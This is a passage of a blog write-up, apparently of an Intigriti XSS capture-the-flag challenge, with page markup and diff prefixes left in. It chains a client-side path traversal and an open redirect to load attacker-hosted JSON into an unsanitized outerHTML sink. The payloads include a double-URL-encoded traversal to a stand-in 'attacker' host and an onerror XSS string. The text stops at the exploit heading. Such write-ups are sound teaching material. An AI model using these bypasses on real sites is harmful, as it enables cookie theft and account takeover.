+      <time datetime="2025-01-05T10:17:19&#43;05:30">2025-01</time><span class="px-2 text-primary-500">&middot;</span><span>1237 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-challenge-overview">🔎 Challenge Overview</a></li>
+    <li><a href="#1-create-note">1) Create Note</a></li>
+    <li><a href="#2-view-note">2) View Note</a></li>
+    <li><a href="#-attack-plan">🥷 Attack plan</a></li>
+    <li><a href="#open-redirect">Open Redirect</a></li>
+    <li><a href="#bypassing-the-cspt-filters">Bypassing the CSPT Filters</a>
+      <ul>
+        <li><a href="#bypassing-isvaliduuid">Bypassing isValidUUID</a></li>
+        <li><a href="#bypassing-the-path-traversal-check">Bypassing the Path traversal check</a></li>
+      </ul>
+    </li>
+    <li><a href="#--final-payloads">🚀  Final Payloads</a></li>
+    <li><a href="#-exploit-">💀 Exploit !!</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-challenge-overview">🔎 Challenge Overview</a></li>
+    <li><a href="#1-create-note">1) Create Note</a></li>
+    <li><a href="#2-view-note">2) View Note</a></li>
+    <li><a href="#-attack-plan">🥷 Attack plan</a></li>
+    <li><a href="#open-redirect">Open Redirect</a></li>
+    <li><a href="#bypassing-the-cspt-filters">Bypassing the CSPT Filters</a>
+      <ul>
+        <li><a href="#bypassing-isvaliduuid">Bypassing isValidUUID</a></li>
+        <li><a href="#bypassing-the-path-traversal-check">Bypassing the Path traversal check</a></li>
+      </ul>
+    </li>
+    <li><a href="#--final-payloads">🚀  Final Payloads</a></li>
+    <li><a href="#-exploit-">💀 Exploit !!</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <p><strong>tl;dr</strong></p>
+<ul>
+<li>Bypassing CSPT filters and UUID validations implemented using Regex .</li>
+<li>Chaining CSPT and Open-Redirect to achieve XSS .</li>
+<li>Finally XSS and retrive the admin cookie .</li>
+</ul>
+<p>Intigriti dropped another awesome XSS challenge,This time created by <a href="https://x.com/_CryptoCat"  target="_blank" rel="noreferrer">@_CryptoCat</a>. The challenge felt fairly straightforward,  definitely less headbanging than usual, I managed to solve it in around 20 minutes after diving in.</p>
+
+<h2 class="relative group">🔎 Challenge Overview
+    <div id="-challenge-overview" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#-challenge-overview" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>The challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="image"
+    src="https://hackmd.io/_uploads/HyPmr2DqA.png"
+    ></figure>
+</p>
+<p>As is typical with XSS challenges, the goal was to obtain the admin bot&rsquo;s cookie, which was the flag. For that we needed XSS.</p>
+<p>Firstly taking a closer look at the 2 features, which are</p>
+<ul>
+<li>Create Note</li>
+<li>View Note</li>
+</ul>
+
+<h2 class="relative group">1) Create Note
+    <div id="1-create-note" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-create-note" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>The Create Note feature is straightforward. It sends a request to <code>/api/notes/fetch</code>, creating a note with a unique UUID. The note can then be viewed by navigating to <code>/view?note-uuid</code> .</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-python=" data-lang="python=">@main.route(&#39;/api/notes/store&#39;, methods=[&#39;POST&#39;])
+@login_required
+def store():
+    data = request.get_json()
+    content = data.get(&#39;content&#39;)
+    # Server-side XSS protection
+    sanitized_content = bleach.clean(content)
+    note = Note.query.filter_by(user_id=current_user.id).first()
+    if note:
+        note.content = sanitized_content
+    else:
+        note = Note(user_id=current_user.id, content=sanitized_content)
+        db.session.add(note)
+
+    db.session.commit()
+    return jsonify({&#39;success&#39;: &#39;Note stored&#39;, &#39;note_id&#39;: note.id})</code></pre></div>
+<p>The note content is sanitized server-side using the Bleach library, so this eliminates any possibility of any quick XSS.But still we had a harmless <strong>Html injection</strong>.</p>
+
+<h2 class="relative group">2) View Note
+    <div id="2-view-note" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#2-view-note" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>This appeared to be the real challenge. Upon checkin <code>view.html</code>, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">urlParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">noteId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">urlParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;note&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">noteId</span>) {
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;note-id-input&#34;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">noteId</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">validateAndFetchNote</span>(<span style="color:#a6e22e">noteId</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></div></div>
+<p>Immediately, my mind turned to <strong>CSPT (Client-Side Path Traversal)</strong>, given that we had control over the fetch request.</p>
+<blockquote><p>Client Side Path Traversal attacks arises when a web application loads some content using XHR(XmlHTTPRequests) or fetch() and the user have control over some section of the path where to load the resource.</p></blockquote><p>Taking a look at the <code>validateAndFetchNote()</code> function</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validateAndFetchNote</span>(<span style="color:#a6e22e">noteId</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">noteId</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isValidUUID</span>(<span style="color:#a6e22e">noteId</span>.<span style="color:#a6e22e">trim</span>())) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;?note=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">noteId</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetchNoteById</span>(<span style="color:#a6e22e">noteId</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">showFlashMessage</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Please enter a valid note ID,&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;danger&#34;</span>
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div></div>
+<p>Looks like there are some checks after all .</p>
+<p>It only fetched notes with valid UUIDs using the <code>isValidUUID()</code> function. Additionally, the fetchNoteByID() function had a CSPT check before making the actual fetch by using <code>noteId.includes(&quot;../&quot;)</code> .</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetchNoteById</span>(<span style="color:#a6e22e">noteId</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">noteId</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;../&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">showFlashMessage</span>(<span style="color:#e6db74">&#34;Input not allowed!&#34;</span>, <span style="color:#e6db74">&#34;danger&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/api/notes/fetch/&#34;</span> <span style="color:#f92672">+</span> decodeURIComponent(<span style="color:#a6e22e">noteId</span>), {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;X-CSRFToken&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">csrf_token</span>,
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">response</span>) =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>())
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">content</span>) {
+</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;note-content&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">content</span>);
+</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">getElementById</span>(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;note-content-section&#34;</span>
+</span></span><span style="display:flex;"><span>                    ).<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;block&#34;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">showFlashMessage</span>(<span style="color:#e6db74">&#34;Note loaded successfully!&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">showFlashMessage</span>(<span style="color:#e6db74">&#34;Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">error</span>, <span style="color:#e6db74">&#34;danger&#34;</span>);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">showFlashMessage</span>(<span style="color:#e6db74">&#34;Note doesn&#39;t exist.&#34;</span>, <span style="color:#e6db74">&#34;info&#34;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">debug</span>) {
+</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;debug-content&#34;</span>).<span style="color:#a6e22e">outerHTML</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">debug</span>;
+</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">getElementById</span>(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;debug-content-section&#34;</span>
+</span></span><span style="display:flex;"><span>                    ).<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;block&#34;</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div></div>
+<p>When our note is fetched, the server returns a JSON object containing the note&rsquo;s content. This content is then rendered using innerHTML, with DOMPurify applied to sanitize it, effectively preventing XSS.</p>
+<p>However, if the JSON response includes a debug key, its value is rendered using <strong>outerHTML</strong> without any sanitization, which can be used to get XSS .</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">debug</span>) {
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;debug-content&#34;</span>).<span style="color:#a6e22e">outerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">debug</span>;
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">getElementById</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;debug-content-section&#34;</span>
+</span></span><span style="display:flex;"><span>        ).<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;block&#34;</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div>
+
+<h2 class="relative group">🥷 Attack plan
+    <div id="-attack-plan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#-attack-plan" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>The plan is to manipulate the fetch request so that it returns a JSON object containing a <strong>debug</strong> key. However, the server only responds with a JSON object that includes a <strong>content key</strong> and the note’s content, with no way to modify this server response directly. The only method to achieve this would be to return the <strong>modified JSON from our own server</strong>.</p>
+<p>However, we only have CSPT (Client-Side Path Traversal) at our disposal, which allows us to control the path of the fetch() request. This means we can only direct the fetch to different endpoints .</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/api/notes/fetch/&#34;</span> <span style="color:#f92672">+</span> decodeURIComponent(<span style="color:#a6e22e">noteId</span>))</span></span></code></pre></div></div>
+<p>Unless there is an <strong>Open-Redirect</strong> in any of the endpoints !!</p>
+<p>If we have an <strong>Open-redirect</strong>, we can use the CSPT to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker&rsquo;s server. From there, we can respond with a JSON object that includes the debug key, containing our XSS payload.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="finalXSS"
+    src="https://hackmd.io/_uploads/Sy56QfKcR.png"
+    ></figure>
+</p>
+
+<h2 class="relative group">Open Redirect
+    <div id="open-redirect" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#open-redirect" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>There is an endpoint named <code>/contact</code> that accepts a query parameter called <strong>return</strong>. This endpoint will redirect the user to the URL specified by the value of the return parameter.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@main.route</span>(<span style="color:#e6db74">&#39;/contact&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">contact</span>():
+</span></span><span style="display:flex;"><span>    form <span style="color:#f92672">=</span> ContactForm()
+</span></span><span style="display:flex;"><span>    return_url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;return&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> form<span style="color:#f92672">.</span>validate_on_submit():
+</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;Thank you for your message!&#39;</span>, <span style="color:#e6db74">&#39;success&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> return_url <span style="color:#f92672">and</span> is_safe_url(return_url):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> redirect(return_url)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;main.home&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> return_url <span style="color:#f92672">and</span> is_safe_url(return_url):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(return_url)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;contact.html&#39;</span>, form<span style="color:#f92672">=</span>form, return_url<span style="color:#f92672">=</span>return_url)</span></span></code></pre></div></div>
+<p>So now we can redirect to the attackers site by just giving the attacker site as the return query parameter.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>                  <span style="color:#f92672">/</span>contact<span style="color:#960050;background-color:#1e0010">?</span><span style="color:#66d9ef">return</span><span style="color:#f92672">=</span>https:<span style="color:#f92672">//</span>attacker<span style="color:#f92672">-</span>site<span style="color:#f92672">.</span>com</span></span></code></pre></div></div>
+
+<h2 class="relative group">Bypassing the CSPT Filters
+    <div id="bypassing-the-cspt-filters" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#bypassing-the-cspt-filters" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Now that we have Open-Redirect in the /contact endpoint all we have to do is path traverse to that endpoint using CSPT.However we have to bypass a few checks for that.</p>
+<ul>
+<li>The note uuid check -&gt; <strong>isValidUUID()</strong> function</li>
+<li>Path traversal check -&gt;  <strong>noteId.includes(&quot;../&quot;)</strong></li>
+</ul>
+
+<h3 class="relative group">Bypassing isValidUUID
+    <div id="bypassing-isvaliduuid" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#bypassing-isvaliduuid" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Looking a bit closer at the <strong>isValidUUID()</strong> function, we can see that it validates UUIDs using a regular expression.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isValidUUID</span>(<span style="color:#a6e22e">noteId</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uuidRegex</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">uuidRegex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">noteId</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div></div>
+<p>Here the Regex <code>[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$</code> only ensures that the UUID pattern appears at the end of the string. <strong>So there can be any prefix to this uuid , that means we can give ../../ before the uuid .</strong></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>../82652102-973d-429d-82e0-245a4fbfd6cb </span></span></code></pre></div></div>
+<p>To ensure that it was a proper UUID the regex should have included a <code>^</code>
+in the beginnning like this.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i</span></span></code></pre></div></div>
+<p>So we can do CSPT to the /contact endpoint like this.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/view?note=../../../contact?return=http://attack&amp;82652102-973d-429d-82e0-245a4fbfd6cb</span></span></code></pre></div></div>
+<p>However ../ was still <strong>blocked !!!</strong></p>
+
+<h3 class="relative group">Bypassing the Path traversal check
+    <div id="bypassing-the-path-traversal-check" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#bypassing-the-path-traversal-check" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Upon looking closer, you can see that after the noteId is being checked, it is URL-decoded within the fetch function.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">noteId</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;../&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">showFlashMessage</span>(<span style="color:#e6db74">&#34;Input not allowed!&#34;</span>, <span style="color:#e6db74">&#34;danger&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/api/notes/fetch/&#34;</span> <span style="color:#f92672">+</span> decodeURIComponent(<span style="color:#a6e22e">noteId</span>), {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;X-CSRFToken&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">csrf_token</span>,
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>        })</span></span></code></pre></div></div>
+<p>So we can easily bypass this check by just double urlencoding the noteId.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>view=..%252F..%252F..%252Fcontact?return=http://attacker&amp;UUID</span></span></code></pre></div></div>
+<p>So during the <strong>noteId.includes(&quot;../&quot;)</strong> check, the noteId will be <strong>..%2F..%2Fcontact</strong>, so the check will return <strong>false</strong>. However, when fetch() is called, noteId gets URL-decoded with decodeURIComponent(noteId), turning it into <strong>../../../contact</strong>.</p>
+
+<h2 class="relative group">🚀  Final Payloads
+    <div id="--final-payloads" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#--final-payloads" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Now that we&rsquo;ve bypassed both security checks, let&rsquo;s combine everything together.</p>
+<ul>
+<li><strong>Regex Bypass</strong>: By using ../../../ as a prefix to the UUID, we can bypass the regex validation.</li>
+<li><strong>Path Traversal Check Bypass</strong>: Double URL encoding the payload allows us to bypass the path traversal check.</li>
+</ul>
+<p>With these steps, we can direct the fetch request to /contacts, which will <strong>trigger an Open Redirect to our attacker&rsquo;s server</strong>. The server responds with JSON containing a debug key with the XSS payload. This payload is then inserted into the outerHTML, leading to XSS.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>..%252F..%252F..%252Fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60</span></span></code></pre></div></div>
+<p>On the attacker’s server, we need to return a JSON object with the key debug and our XSS payload as the value.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{ <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#e6db74">&#34;&lt;img src=x onerror=alert()&gt;&#34;</span>} <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">for</span> <span style="color:#960050;background-color:#1e0010">simple</span> <span style="color:#960050;background-color:#1e0010">alert</span></span></span></code></pre></div></div>
+
+<h2 class="relative group">💀 Exploit !!
+    <div id="-exploit-" class="anchor"></div>
+    
+    <span
